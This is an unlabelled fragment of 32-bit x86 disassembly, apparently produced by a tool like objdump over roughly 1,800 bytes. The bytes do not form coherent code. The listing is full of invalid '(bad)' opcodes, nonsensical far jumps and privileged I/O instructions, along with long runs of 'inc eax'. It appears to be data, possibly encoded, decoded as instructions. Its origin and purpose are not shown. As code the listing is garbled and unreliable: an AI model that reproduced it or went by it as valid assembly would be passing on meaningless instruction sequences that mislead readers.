  409842:	mov    edi,0x40404042
  409847:	inc    eax
  409848:	inc    eax
  409849:	inc    eax
  40984a:	inc    eax
  40984b:	inc    eax
  40984c:	inc    eax
  40984d:	inc    eax
  40984e:	xchg   DWORD PTR [eax-0x70],eax
  409851:	mov    ds:0x2aa9402c,al
  409856:	jne    0x409898
  409858:	jo     0x409880
  40985a:	dec    eax
  40985b:	fs mov al,0xd2
  40985e:	xchg   edx,eax
  40985f:	inc    eax
  409860:	xor    bh,cl
  409862:	int    0x22
  409864:	(bad)  
  409865:	stos   DWORD PTR es:[edi],eax
  409866:	bound  esi,QWORD PTR [ebx+0x40]
  409869:	inc    eax
  40986a:	inc    eax
  40986b:	inc    eax
  40986c:	inc    eax
  40986d:	inc    eax
  40986e:	inc    eax
  40986f:	inc    eax
  409870:	add    al,dl
  409872:	mov    eax,ds:0xa023491b
  409877:	mov    BYTE PTR [eax+0x6d],al
  40987a:	popa   
  40987b:	(bad)  
  40987c:	fiadd  WORD PTR ds:0x21784064
  409883:	inc    esp
  409884:	test   al,0x40
  409886:	leave  
  409887:	ins    BYTE PTR es:[edi],dx
  409888:	inc    eax
  409889:	mov    al,0x57
  40988b:	sub    al,0x11
  40988d:	arpl   WORD PTR [ebp+eiz*2+0x40404040],bx
  409894:	inc    eax
  409895:	inc    eax
  409896:	and    eax,0x72404040
  40989b:	adc    esp,DWORD PTR [eax+0x5574c46]
  4098a1:	inc    eax
  4098a2:	inc    eax
  4098a3:	pop    esi
  4098a4:	pop    ss
  4098a5:	out    0x42,al
  4098a7:	enter  0xc643,0x40
  4098ab:	nop
  4098ac:	pusha  
  4098ad:	popf   
  4098ae:	jne    0x4098f0
  4098b0:	mov    al,ds:0x40404040
  4098b5:	inc    eax
  4098b6:	inc    eax
  4098b7:	inc    eax
  4098b8:	inc    eax
  4098b9:	inc    eax
  4098ba:	inc    eax
  4098bb:	rol    DWORD PTR [eax+0x60],1
  4098be:	addr16 xchg ebx,eax
  4098c0:	adc    BYTE PTR [edx],dh
  4098c2:	add    eax,0xe1ea7162
  4098c7:	sub    al,0x62
  4098c9:	and    ebx,ecx
  4098cb:	add    eax,0x44425040
  4098d0:	jmp    0x6033:0x40874b00
  4098d7:	aad    0x24
  4098d9:	shr    BYTE PTR [ebx+0x40404040],0x40
  4098e0:	inc    eax
  4098e1:	rol    DWORD PTR [eax+0x40],0x16
  4098e5:	inc    eax
  4098e6:	jnp    0x40990c
  4098e8:	or     ecx,ebp
  4098ea:	pop    edx
  4098eb:	inc    edx
  4098ec:	pusha  
  4098ed:	inc    ecx
  4098ee:	jno    0x40995c
  4098f0:	(bad)  
  4098f1:	fsubr  QWORD PTR [edx+esi*1+0x21704041]
  4098f8:	adc    esp,0x40004040
  4098fe:	inc    eax
  4098ff:	inc    eax
  409900:	inc    eax
  409901:	inc    eax
  409902:	inc    eax
  409903:	ret    
  409904:	inc    ecx
  409905:	jge    0x409947
  409907:	push   ecx
  409908:	fdivr  DWORD PTR [eax]
  40990a:	pop    esp
  40990b:	mov    ebp,0x6240dcb8
  409910:	and    al,BYTE PTR [edx+0x63]
  409913:	mov    esi,0x9743953d
  409918:	xor    BYTE PTR [edx+0x62],bh
  40991b:	imul   eax,ebx,0x40444030
  409921:	popf   
  409922:	and    BYTE PTR [ecx+0x40],bl
  409925:	inc    eax
  409926:	inc    eax
  409927:	inc    eax
  409928:	inc    eax
  409929:	inc    eax
  40992a:	inc    eax
  40992b:	inc    eax
  40992c:	inc    eax
  40992d:	inc    eax
  40992e:	inc    ecx
  40992f:	mov    esp,0xfda1d340
  409934:	(bad)
  409937:	add    eax,0x282d4040
  40993c:	in     al,dx
  40993d:	or     dl,BYTE PTR [ebx+0x40]
  409940:	inc    eax
  409941:	lock inc esp
  409943:	inc    eax
  409944:	gs (bad) 
  409947:	xchg   edx,eax
  409948:	inc    eax
  409949:	and    DWORD PTR [edx+0x4d],esp
  40994c:	mov    eax,ds:0xb36bb789
  409951:	inc    eax
  409952:	and    ebp,edi
  409954:	add    BYTE PTR [eax+0x40],0x40
  409958:	inc    eax
  409959:	inc    eax
  40995a:	inc    eax
  40995b:	int3   
  40995c:	jne    0x40999e
  40995e:	push   cs
  40995f:	jmp    0x409944
  409961:	xchg   ebx,eax
  409962:	lock dec esi
  409964:	adc    cl,BYTE PTR [eax+ecx*8-0x28]
  409968:	mov    WORD PTR [ebp+edi*4-0x3effbfe0],?
  40996f:	inc    eax
  409970:	inc    eax
  409971:	inc    eax
  409972:	inc    eax
  409973:	add    BYTE PTR [eax+0x44],al
  409976:	nop
  409977:	(bad)  
  409978:	(bad)  
  409979:	arpl   WORD PTR [edi+eiz*1+0x17],cx
  40997d:	sub    eax,0xd5631068
  409982:	dec    ebp
  409983:	xor    DWORD PTR [esi-0x42],eax
  409986:	ss push eax
  409988:	adc    DWORD PTR [eax+0x64e1d17f],ebp
  40998e:	outs   dx,DWORD PTR ds:[esi]
  40998f:	jmp    0x409919
  409991:	adc    al,BYTE PTR [eax+0x40]
  409994:	inc    eax
  409995:	inc    eax
  409996:	inc    eax
  409997:	inc    eax
  409998:	inc    eax
  409999:	inc    eax
  40999a:	inc    DWORD PTR [eax-0x7d]
  40999d:	inc    ecx
  40999e:	adc    al,0x8d
  4099a0:	mov    esi,ebx
  4099a2:	or     eax,0xa1704048
  4099a7:	inc    esp
  4099a8:	pop    eax
  4099a9:	inc    eax
  4099aa:	retf   
  4099ab:	inc    ecx
  4099ac:	sahf   
  4099ad:	cmp    DWORD PTR [esi+0x2c],esi
  4099b0:	and    al,0x2c
  4099b2:	adc    BYTE PTR [esi-0x42],ah
  4099b5:	and    BYTE PTR [ebx-0x44],ah
  4099b8:	mov    eax,ds:0x8e048c63
  4099bd:	icebp  
  4099be:	inc    eax
  4099bf:	shl    BYTE PTR [ebx+0x2c],1
  4099c2:	inc    eax
  4099c3:	inc    eax
  4099c4:	inc    eax
  4099c5:	inc    eax
  4099c6:	inc    eax
  4099c7:	inc    eax
  4099c8:	inc    eax
  4099c9:	inc    eax
  4099ca:	inc    eax
  4099cb:	inc    eax
  4099cc:	add    eax,0x601e4c65
  4099d1:	lea    edx,[esi+esi*2-0x35]
  4099d5:	inc    eax
  4099d6:	xor    BYTE PTR [ebp+0x1c2444ef],dl
  4099dc:	mov    WORD PTR [eax],fs
  4099de:	sahf   
  4099df:	inc    edi
  4099e0:	xor    ebp,DWORD PTR [eax+eax*2]
  4099e3:	inc    eax
  4099e4:	inc    eax
  4099e5:	inc    eax
  4099e6:	inc    eax
  4099e7:	inc    eax
  4099e8:	inc    eax
  4099e9:	inc    eax
  4099ea:	add    BYTE PTR [ecx-0x4190ea9e],ah
  4099f0:	jno    0x409a48
  4099f2:	mov    edx,0x1c91763
  4099f7:	inc    eax
  4099f8:	xchg   al,ah
  4099fa:	lds    edx,FWORD PTR [eax+0x20]
  4099fd:	dec    eax
  4099fe:	test   al,0x40
  409a00:	mov    bl,0x2c
  409a02:	addr16 xchg ebx,eax
  409a04:	out    dx,al
  409a05:	add    eax,0x402f4041
  409a0a:	inc    eax
  409a0b:	inc    eax
  409a0c:	inc    eax
  409a0d:	inc    eax
  409a0e:	inc    eax
  409a0f:	and    eax,0xd404040
  409a14:	jle    0x4099ab
  409a16:	sub    al,dh
  409a18:	sub    cl,BYTE PTR [eax+eax*2-0x1f]
  409a1c:	bound  edi,QWORD PTR fs:[esp+ebx*4+0x6a704011]
  409a24:	dec    ecx
  409a25:	xor    DWORD PTR [edx+0xd],esp
  409a28:	dec    eax
  409a29:	inc    eax
  409a2a:	daa    
  409a2b:	data16 sub al,0x40
  409a2e:	inc    eax
  409a2f:	inc    eax
  409a30:	inc    eax
  409a31:	inc    eax
  409a32:	inc    eax
  409a33:	inc    eax
  409a34:	inc    eax
  409a35:	inc    eax
  409a36:	inc    eax
  409a37:	push   esp
  409a38:	stc    
  409a39:	inc    ebx
  409a3a:	or     eax,0xb87c4540
  409a3f:	bound  esp,QWORD PTR [edx-0x48]
  409a42:	inc    esp
  409a43:	pop    eax
  409a44:	nop
  409a45:	inc    edx
  409a46:	aad    0x58
  409a48:	and    cl,BYTE PTR ds:0x60344063
  409a4e:	pop    esp
  409a4f:	dec    ecx
  409a50:	ror    bl,1
  409a52:	mov    WORD PTR [eax+0x30],es
  409a55:	and    bh,dh
  409a57:	add    DWORD PTR [eax-0x78],eax
  409a5a:	inc    eax
  409a5b:	inc    eax
  409a5c:	inc    eax
  409a5d:	inc    eax
  409a5e:	inc    eax
  409a5f:	inc    eax
  409a60:	rol    DWORD PTR [eax+0x40],0x67
  409a64:	inc    eax
  409a65:	jae    0x409a81
  409a67:	dec    ebp
  409a68:	inc    edx
  409a69:	clc    
  409a6a:	inc    esp
  409a6b:	popa   
  409a6c:	push   esp
  409a6d:	retf   0x3c75
  409a70:	push   eax
  409a71:	imul   ebx,DWORD PTR [ecx],0x6c
  409a74:	inc    eax
  409a75:	ja     0x409ada
  409a77:	mov    dh,0x87
  409a79:	dec    eax
  409a7a:	hlt    
  409a7b:	bound  eax,QWORD PTR [eax+0x42]
  409a7e:	ja     0x409a4d
  409a80:	fs inc ebp
  409a82:	arpl   WORD PTR [ebp+0x40],sp
  409a85:	aad    0xeb
  409a87:	inc    eax
  409a88:	inc    eax
  409a89:	add    BYTE PTR [eax+0x40],al
  409a8c:	inc    eax
  409a8d:	inc    eax
  409a8e:	inc    eax
  409a8f:	inc    eax
  409a90:	or     DWORD PTR [ebp-0x27],ebp
  409a93:	jl     0x409a19
  409a95:	push   eax
  409a96:	inc    edx
  409a97:	inc    eax
  409a98:	(bad)  
  409a99:	fisub  WORD PTR [ecx-0x55]
  409a9c:	arpl   WORD PTR [eax-0x21],ax
  409a9f:	and    eax,0x42ab5149
  409aa4:	inc    eax
  409aa5:	inc    eax
  409aa6:	inc    eax
  409aa7:	inc    eax
  409aa8:	inc    eax
  409aa9:	inc    eax
  409aaa:	inc    eax
  409aab:	inc    eax
  409aac:	inc    eax
  409aad:	inc    eax
  409aae:	sbb    al,BYTE PTR [eax-0x11]
  409ab1:	addr16 sub al,0x4
  409ab4:	inc    esp
  409ab5:	popa   
  409ab6:	test   al,0x40
  409ab8:	pop    edx
  409ab9:	and    BYTE PTR [eax+ecx*2+0x4c423754],dh
  409ac0:	(bad)  
  409ac1:	add    ah,dh
  409ac3:	push   eax
  409ac4:	retf   
  409ac5:	arpl   WORD PTR [edx],bp
  409ac7:	inc    eax
  409ac8:	adc    al,0x52
  409aca:	mov    ebp,0x41a2465f
  409acf:	inc    eax
  409ad0:	inc    esi
  409ad1:	and    BYTE PTR [eax+eax*2+0x40],cl
  409ad5:	inc    eax
  409ad6:	inc    eax
  409ad7:	inc    eax
  409ad8:	inc    eax
  409ad9:	int3   
  409ada:	jne    0x409b1c
  409adc:	shr    BYTE PTR [eax-0x6dbf9b3f],1
  409ae2:	punpcklwd mm6,DWORD PTR [edi]
  409ae5:	adc    BYTE PTR [esp+ecx*1-0x26c080b8],al
  409aec:	je     0x409b3a
  409aee:	adc    eax,0x75404062
  409af3:	bound  ebp,QWORD PTR [eax+0x40644141]
  409af9:	pusha  
  409afa:	inc    eax
  409afb:	add    cl,al
  409afd:	inc    eax
  409afe:	inc    eax
  409aff:	inc    eax
  409b00:	inc    eax
  409b01:	add    BYTE PTR [eax-0x4a],al
  409b04:	ss adc edx,esp
  409b07:	jp     0x409b45
  409b09:	inc    eax
  409b0a:	pop    ebx
  409b0b:	adc    dh,BYTE PTR [ebx+0x41]
  409b0e:	push   eax
  409b0f:	pop    esp
  409b10:	inc    sp
  409b12:	inc    eax
  409b13:	inc    eax
  409b14:	inc    eax
  409b15:	inc    eax
  409b16:	inc    eax
  409b17:	inc    eax
  409b18:	inc    eax
  409b19:	inc    eax
  409b1a:	inc    DWORD PTR [eax+0x74]
  409b1d:	std    
  409b1e:	out    0x2b,al
  409b20:	bound  esp,QWORD PTR [bp+0x40]
  409b24:	sub    DWORD PTR [edx],edx
  409b26:	ds cmp al,0x47
  409b29:	dec    eax
  409b2a:	jl     0x409b6c
  409b2c:	loop   0x409b2d
  409b2e:	in     al,0x62
  409b30:	inc    ebx
  409b31:	sub    eax,0x4f3d2462
  409b36:	and    dh,cl
  409b38:	mov    DWORD PTR [ebp+0x66],esp
  409b3b:	rol    DWORD PTR gs:[eax+0x40],1
  409b3f:	inc    eax
  409b40:	inc    eax
  409b41:	inc    eax
  409b42:	inc    eax
  409b43:	inc    eax
  409b44:	inc    eax
  409b45:	inc    eax
  409b46:	inc    eax
  409b47:	test   eax,0x5368f0d5
  409b4c:	js     0x409bae
  409b4e:	inc    ecx
  409b4f:	add    eax,0x741c63cd
  409b54:	push   0x80f1107a
  409b59:	inc    ecx
  409b5a:	fsubr  DWORD PTR [eax+0x40262841]
  409b60:	adc    ch,ah
  409b62:	bound  eax,QWORD PTR [ebp+0x265834ac]
  409b68:	bound  eax,QWORD PTR [esi+0x40]
  409b6b:	inc    eax
  409b6c:	inc    eax
  409b6d:	inc    eax
  409b6e:	inc    eax
  409b6f:	inc    eax
  409b70:	inc    eax
  409b71:	inc    eax
  409b72:	add    BYTE PTR [edx+0x66],ah
  409b75:	push   eax
  409b76:	daa    
  409b77:	xor    DWORD PTR [ebp+edi*4-0x58],esi
  409b7b:	xor    al,0x62
  409b7d:	test   al,0x2e
  409b7f:	pop    eax
  409b80:	inc    eax
  409b81:	mov    dl,0x10
  409b83:	adc    DWORD PTR [eax],edx
  409b85:	mov    edi,0xe506d325
  409b8a:	enter  0xec77,0x3e
  409b8e:	or     al,0x40
  409b90:	mov    eax,0x5a8fbf6
  409b95:	inc    esp
  409b96:	inc    eax
  409b97:	inc    eax
  409b98:	inc    eax
  409b99:	inc    eax
  409b9a:	inc    eax
  409b9b:	inc    eax
  409b9c:	and    eax,0x6d404040
  409ba1:	xchg   edx,eax
  409ba2:	or     dl,BYTE PTR [edx+eiz*2+0x11]
  409ba6:	int    0x4c
  409ba8:	xor    al,0xa9
  409baa:	adc    edi,DWORD PTR [edi+0x401c4c6e]
  409bb0:	inc    eax
  409bb1:	inc    eax
  409bb2:	inc    eax
  409bb3:	inc    eax
  409bb4:	inc    eax
  409bb5:	inc    eax
  409bb6:	inc    eax
  409bb7:	inc    eax
  409bb8:	inc    eax
  409bb9:	xor    eax,0xbd3a182e
  409bbe:	int3   
  409bbf:	or     eax,0x93250542
  409bc4:	xchg   DWORD PTR [eax+0x5c61cb52],esi
  409bca:	xor    al,0x9d
  409bcc:	sbb    eax,0x3c6d305f
  409bd1:	push   ebx
  409bd2:	cs jo  0x409bd8
  409bd5:	out    dx,eax
  409bd6:	aad    0x45
  409bd8:	arpl   si,dx
  409bda:	das    
  409bdb:	inc    eax
  409bdc:	inc    eax
  409bdd:	inc    eax
  409bde:	inc    eax
  409bdf:	inc    eax
  409be0:	inc    eax
  409be1:	rol    DWORD PTR [eax+0x40],0xd1
  409be5:	or     DWORD PTR ds:0x40ba6e62,edi
  409beb:	add    esp,DWORD PTR [ecx]
  409bed:	mov    DWORD PTR [esp+eax*4+0x2c],eax
  409bf1:	rcl    DWORD PTR [eax+0x2d485540],0x7c
  409bf8:	addr16 popa 
  409bfa:	outs   dx,BYTE PTR ds:[esi]
  409bfb:	dec    edx
  409bfc:	inc    eax
  409bfd:	inc    eax
  409bfe:	add    BYTE PTR [eax+0x40],al
  409c01:	inc    eax
  409c02:	inc    eax
  409c03:	inc    eax
  409c04:	inc    eax
  409c05:	add    eax,DWORD PTR ds:0x3a1066ae
  409c0b:	mov    ecx,0xd503f54d
  409c10:	inc    edi
  409c11:	arpl   WORD PTR [edx-0x4d],sp
  409c14:	and    eax,0x40ca8452
  409c19:	inc    eax
  409c1a:	inc    eax
  409c1b:	inc    eax
  409c1c:	inc    eax
  409c1d:	inc    eax
  409c1e:	inc    eax
  409c1f:	inc    eax
  409c20:	inc    eax
  409c21:	inc    eax
  409c22:	inc    edx
  409c23:	ja     0x409bc7
  409c25:	test   al,0x33
  409c27:	xchg   ecx,eax
  409c28:	xor    BYTE PTR [edx+0x42c1a83d],ch
  409c2e:	das    
  409c2f:	retf   
  409c30:	jmp    0x409c97
  409c32:	sbb    BYTE PTR [eax],dl
  409c34:	repnz sub ch,BYTE PTR [ecx+edx*2]
  409c38:	sbb    BYTE PTR [esi+0x421548cc],0x23
  409c3f:	pop    ds
  409c40:	inc    eax
  409c41:	inc    eax
  409c42:	inc    eax
  409c43:	inc    eax
  409c44:	inc    eax
  409c45:	inc    eax
  409c46:	int3   
  409c47:	jne    0x409c89
  409c49:	mov    ebp,0xf6419960
  409c4e:	inc    ebx
  409c4f:	pusha  
  409c50:	hlt    
  409c51:	ins    DWORD PTR es:[edi],dx
  409c52:	push   edx
  409c53:	test   al,0x57
  409c55:	dec    edi
  409c56:	inc    eax
  409c57:	jp     0x409cc0
  409c59:	dec    edx
  409c5a:	int    0x11
  409c5c:	inc    eax
  409c5d:	mov    al,ds:0x1522e90
  409c62:	inc    edi
  409c63:	mov    eax,0x2f694452
  409c68:	rol    BYTE PTR [esi-0x13],1
  409c6b:	inc    ecx
  409c6c:	popa   
  409c6d:	inc    eax
  409c6e:	add    cl,al
  409c70:	inc    eax
  409c71:	inc    eax
  409c72:	inc    eax
  409c73:	inc    eax
  409c74:	add    BYTE PTR [eax+0x60],al
  409c77:	inc    edx
  409c78:	sub    DWORD PTR [ebp+0x486d4400],edi
  409c7e:	sub    al,0x4c
  409c80:	xor    al,0x11
  409c82:	xor    ch,BYTE PTR [eax+ebx*2]
  409c85:	bound  edx,QWORD PTR fs:[ebx+eiz*1-0x42]
  409c8a:	push   ebx
  409c8b:	stos   BYTE PTR es:[edi],al
  409c8c:	fs sub eax,0xbf25366a
  409c92:	add    ch,al
  409c94:	mov    ah,0x5c
  409c96:	or     BYTE PTR [eax+0x40404040],ah
  409c9c:	inc    eax
  409c9d:	inc    eax
  409c9e:	inc    eax
  409c9f:	inc    eax
  409ca0:	inc    DWORD PTR [eax+0x2e]
  409ca3:	inc    eax
  409ca4:	sub    eax,0x62633041
  409ca9:	and    BYTE PTR [esi],ch
  409cab:	inc    eax
  409cac:	dec    eax
  409cad:	out    dx,al
  409cae:	imul   esi,ecx,0xffffff99
  409cb1:	push   0x2f
  409cb3:	push   eax
  409cb4:	test   DWORD PTR [esp+ebp*2-0x5c],eax
  409cb8:	test   eax,0x718203f9
  409cbd:	sub    al,0x29
  409cbf:	push   edx
  409cc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409cc1:	inc    eax
  409cc2:	inc    eax
  409cc3:	inc    eax
  409cc4:	inc    eax
  409cc5:	inc    eax
  409cc6:	inc    eax
  409cc7:	inc    eax
  409cc8:	inc    eax
  409cc9:	inc    eax
  409cca:	inc    eax
  409ccb:	inc    eax
  409ccc:	inc    eax
  409ccd:	verw   WORD PTR [eax-0x7dc9f1e5]
  409cd4:	inc    eax
  409cd5:	inc    eax
  409cd6:	sub    ebx,DWORD PTR [edi-0x40]
  409cd9:	xor    al,0x2f
  409cdb:	sub    eax,DWORD PTR [eax-0x5a]
  409cde:	jb     0x409c6d
  409ce0:	loope  0x409ca5
  409ce2:	bound  eax,QWORD PTR [edx+0x40]
  409ce5:	loopne 0x409d27
  409ce7:	inc    esp
  409ce8:	dec    eax
  409ce9:	jmp    0x2c7a:0x514a901f
  409cf0:	cmc    
  409cf1:	bound  eax,QWORD PTR [eax+0x40]
  409cf4:	inc    eax
  409cf5:	inc    eax
  409cf6:	inc    eax
  409cf7:	inc    eax
  409cf8:	inc    eax
  409cf9:	inc    eax
  409cfa:	add    BYTE PTR [eax-0x13bfb24c],ch
  409d00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d01:	mov    ah,0x14
  409d03:	bound  esp,QWORD PTR [edx+0x25]
  409d06:	jle    0x409c89
  409d08:	int    0x6a
  409d0a:	inc    eax
  409d0b:	inc    eax
  409d0c:	inc    eax
  409d0d:	inc    eax
  409d0e:	inc    eax
  409d0f:	inc    eax
  409d10:	and    eax,0x34404040
  409d15:	outs   dx,DWORD PTR ds:[esi]
  409d16:	cli    
  409d17:	ss and al,0x59
  409d1a:	inc    ecx
  409d1b:	inc    ebp
  409d1c:	adc    eax,0x752965c0
  409d21:	sub    esi,0x40404a64
  409d27:	inc    eax
  409d28:	inc    eax
  409d29:	inc    eax
  409d2a:	inc    eax
  409d2b:	inc    eax
  409d2c:	inc    eax
  409d2d:	inc    eax
  409d2e:	inc    eax
  409d2f:	bound  ebp,QWORD PTR ds:0x4495412c
  409d35:	out    dx,eax
  409d36:	(bad)  
  409d37:	retf   
  409d38:	arpl   WORD PTR [ecx],ax
  409d3a:	pop    eax
  409d3b:	sub    BYTE PTR [esp+edi*8],0x1c
  409d3f:	inc    eax
  409d40:	inc    eax
  409d41:	inc    eax
  409d42:	inc    eax
  409d43:	inc    eax
  409d44:	inc    eax
  409d45:	rol    DWORD PTR [eax+0x40],0x5c
  409d49:	arpl   WORD PTR [ebp+0x39],bp
  409d4c:	ins    DWORD PTR es:[edi],dx
  409d4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d4e:	xor    ax,0x2815
  409d52:	xor    BYTE PTR [esi-0xe],al
  409d55:	dec    ebp
  409d56:	xor    al,0x40
  409d58:	retf   
  409d59:	fs and eax,0x808d0155
  409d5f:	dec    esp
  409d60:	inc    ecx
  409d61:	push   esp
  409d62:	and    eax,0x40405d51
  409d67:	add    BYTE PTR [eax+0x40],al
  409d6a:	inc    eax
  409d6b:	inc    eax
  409d6c:	inc    eax
  409d6d:	inc    eax
  409d6e:	inc    esp
  409d6f:	lds    eax,FWORD PTR [ecx+0x63]
  409d72:	push   esi
  409d73:	or     esp,DWORD PTR [edi+0x56]
  409d76:	sub    al,0x9f
  409d78:	fst    QWORD PTR [eax-0x7e2c9fdf]
  409d7e:	mov    ds:0x404040bf,al
  409d83:	inc    eax
  409d84:	inc    eax
  409d85:	inc    eax
  409d86:	inc    eax
  409d87:	inc    eax
  409d88:	inc    eax
  409d89:	inc    eax
  409d8a:	cmp    al,0x54
  409d8c:	mov    edx,0xd50c447a
  409d91:	fs push 0x152e68ce
  409d97:	adc    esp,DWORD PTR [edx-0x70]
  409d9a:	dec    edi
  409d9b:	xor    BYTE PTR [eax+0x40],al
  409d9e:	inc    eax
  409d9f:	inc    eax
  409da0:	inc    eax
  409da1:	inc    eax
  409da2:	int3   
  409da3:	jne    0x409de5
  409da5:	test   al,0x2f
  409da7:	cmp    BYTE PTR [ecx-0x12],cl
  409daa:	mov    ds,esp
  409dac:	xlat   BYTE PTR ds:[ebx]
  409dad:	dec    edx
  409dae:	sub    DWORD PTR [ebx+0x7099440b],edx
  409db4:	sub    al,0x37
  409db6:	xor    al,0x19
  409db8:	dec    ebp
  409db9:	sub    al,0x62
  409dbb:	lods   al,BYTE PTR ds:[esi]
  409dbc:	fadd   DWORD PTR [eax+0x23]
  409dbf:	inc    eax
  409dc0:	add    cl,al
  409dc2:	inc    eax
  409dc3:	inc    eax
  409dc4:	inc    eax
  409dc5:	inc    eax
  409dc6:	add    BYTE PTR [eax+0x31],al
  409dc9:	add    DWORD PTR [eax+0x2afbb6cd],esp
  409dcf:	and    eax,0x1f4d4241
  409dd4:	add    BYTE PTR [eax-0x7f8ad17a],ch
  409dda:	inc    eax
  409ddb:	inc    eax
  409ddc:	inc    eax
  409ddd:	inc    eax
  409dde:	inc    eax
  409ddf:	inc    eax
  409de0:	inc    eax
  409de1:	inc    eax
  409de2:	inc    DWORD PTR [eax-0x73]
  409de5:	lds    edx,FWORD PTR [eax+edx*1+0x3a]
  409de9:	cs inc ecx
  409deb:	xor    al,BYTE PTR [eax+edx*4-0x27]
  409def:	in     al,dx
  409df0:	lea    ebp,[edi]
  409df2:	inc    eax
  409df3:	inc    eax
  409df4:	inc    eax
  409df5:	inc    eax
  409df6:	inc    eax
  409df7:	inc    eax
  409df8:	inc    eax
  409df9:	inc    eax
  409dfa:	inc    eax
  409dfb:	inc    eax
  409dfc:	jg     0x409e5d
  409dfe:	sub    al,0x38
  409e00:	and    BYTE PTR [edx+0x24],al
  409e03:	add    eax,DWORD PTR [ecx]
  409e05:	sbb    BYTE PTR [esi+0x16617666],0x40
  409e0c:	lahf   
  409e0d:	jp     0x409dd4
  409e0f:	inc    esi
  409e10:	js     0x409e6e
  409e12:	arpl   WORD PTR [eax-0x41],ax
  409e15:	mov    edx,0x63623666
  409e1a:	inc    ecx
  409e1b:	inc    eax
  409e1c:	push   ecx
  409e1d:	dec    edi
  409e1e:	(bad)  
  409e1f:	stc    
  409e20:	fs inc eax
  409e22:	inc    eax
  409e23:	inc    eax
  409e24:	inc    eax
  409e25:	inc    eax
  409e26:	inc    eax
  409e27:	inc    eax
  409e28:	inc    eax
  409e29:	add    dh,al
  409e2b:	bound  ecx,QWORD PTR [edx-0x41]
  409e2e:	add    BYTE PTR [ebp+eax*1-0x1c],0xb0
  409e33:	dec    ecx
  409e34:	dec    ebp
  409e35:	push   ecx
  409e36:	sub    al,0x2c
  409e38:	xchg   DWORD PTR [ecx+0x62],ebp
  409e3b:	sub    al,0x24
  409e3d:	mov    edi,0xa8429c48
  409e42:	inc    ebp
  409e43:	arpl   WORD PTR ds:0xd2d58052,sp
  409e49:	adc    esp,eax
  409e4b:	mov    dl,0x24
  409e4d:	inc    eax
  409e4e:	inc    eax
  409e4f:	inc    eax
  409e50:	inc    eax
  409e51:	inc    eax
  409e52:	inc    eax
  409e53:	and    eax,0x30404040
  409e58:	sub    eax,0x4fbc5457
  409e5d:	test   al,0x2f
  409e5f:	add    al,0x48
  409e61:	inc    BYTE PTR [edx+0x41]
  409e64:	sbb    BYTE PTR [edx],dl
  409e66:	and    eax,DWORD PTR [eax-0x80]
  409e69:	inc    esp
  409e6a:	rol    ebp,1
  409e6c:	dec    ebx
  409e6d:	dec    esp
  409e6e:	cs (bad) 
  409e71:	sub    al,0xa7
  409e73:	test   al,0x65
  409e75:	adc    eax,0x40404040
  409e7a:	inc    eax
  409e7b:	inc    eax
  409e7c:	inc    eax
  409e7d:	inc    eax
  409e7e:	inc    eax
  409e7f:	inc    eax
  409e80:	and    eax,0x5f9a0252
  409e85:	bound  ecx,QWORD PTR [ebx+ecx*8+0x2c]
  409e89:	jo     0x409e12
  409e8b:	int    0xf9
  409e8d:	push   ebp
  409e8e:	and    eax,DWORD PTR [edx+esi*1+0x65]
  409e92:	pusha  
  409e93:	and    al,BYTE PTR [eax+0x40]
  409e96:	inc    eax
  409e97:	inc    eax
  409e98:	inc    eax
  409e99:	inc    eax
  409e9a:	rol    DWORD PTR [eax+0x40],0xb1
  409e9e:	call   0xa27600dc
  409ea3:	sub    BYTE PTR [esi],0x14
  409ea6:	push   esp
  409ea7:	rcl    ah,1
  409ea9:	ins    DWORD PTR es:[edi],dx
  409eaa:	imul   ebp,ebx,0x64
  409ead:	bound  edx,QWORD PTR [ecx]
  409eaf:	push   0x34d82d63
  409eb4:	inc    esp
  409eb5:	push   0x58
  409eb7:	test   al,0x2a
  409eb9:	xor    ch,BYTE PTR [ebx+0x0]
  409ebc:	sub    al,0x24
  409ebe:	or     eax,0x402f2c12
  409ec3:	inc    eax
  409ec4:	add    BYTE PTR [eax+0x40],al
  409ec7:	inc    eax
  409ec8:	inc    eax
  409ec9:	inc    eax
  409eca:	inc    eax
  409ecb:	fild   WORD PTR [eax+0x48cb4c98]
  409ed1:	xor    al,0x26
  409ed3:	push   edx
  409ed4:	and    eax,0x42417fc5
  409ed9:	inc    eax
  409eda:	ins    DWORD PTR es:[edi],dx
  409edb:	lahf   
  409edc:	pop    es
  409edd:	dec    edx
  409ede:	cmp    eax,0x40a8d5e2
  409ee3:	inc    eax
  409ee4:	inc    eax
  409ee5:	inc    eax
  409ee6:	inc    eax
  409ee7:	inc    eax
  409ee8:	inc    eax
  409ee9:	inc    eax
  409eea:	inc    eax
  409eeb:	inc    eax
  409eec:	aaa    
  409eed:	push   edx
  409eee:	sub    dh,0x4a
  409ef1:	sbb    al,0x6c
  409ef3:	cmp    eax,0x442e9f37
  409ef8:	mov    esp,0x37c36862
  409efd:	push   edx
  409efe:	pop    edx
  409eff:	sub    al,0xa8
  409f01:	imul   eax,DWORD PTR [eax+0x40],0x6d
  409f05:	lahf   
  409f06:	add    BYTE PTR [esi+0x40405c69],dl
  409f0c:	inc    eax
  409f0d:	inc    eax
  409f0e:	inc    eax
  409f0f:	inc    eax
  409f10:	int3   
  409f11:	jne    0x409f53
  409f13:	inc    eax
  409f14:	inc    ebp
  409f15:	cmp    BYTE PTR [edx+0x29],dl
  409f18:	aad    0xc7
  409f1a:	sub    eax,0x9f6fc242
  409f1f:	mov    BYTE PTR [edi+0x62],0xe8
  409f23:	imul   ecx,DWORD PTR [eax+0x40],0x4040c100
  409f2a:	inc    eax
  409f2b:	inc    eax
  409f2c:	add    BYTE PTR [eax+0x2e],al
  409f2f:	xor    al,0x1
  409f31:	out    dx,al
  409f32:	dec    edx
  409f33:	shr    BYTE PTR [ecx+0x15542f62],1
  409f39:	inc    esp
  409f3a:	and    cl,cl
  409f3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f3d:	add    eax,0x2c7a3129
  409f42:	jno    0x409f84
  409f44:	inc    eax
  409f45:	inc    eax
  409f46:	inc    eax
  409f47:	inc    eax
  409f48:	inc    eax
  409f49:	inc    eax
  409f4a:	inc    eax
  409f4b:	inc    DWORD PTR [eax+0x46]
  409f4e:	inc    ebx
  409f4f:	xchg   DWORD PTR [edi*4+0x6d709402],esi
  409f56:	fld    QWORD PTR [edi+0x21]
  409f59:	jae    0x409f93
  409f5b:	dec    eax
  409f5c:	popf   
  409f5d:	push   0xffffff8c
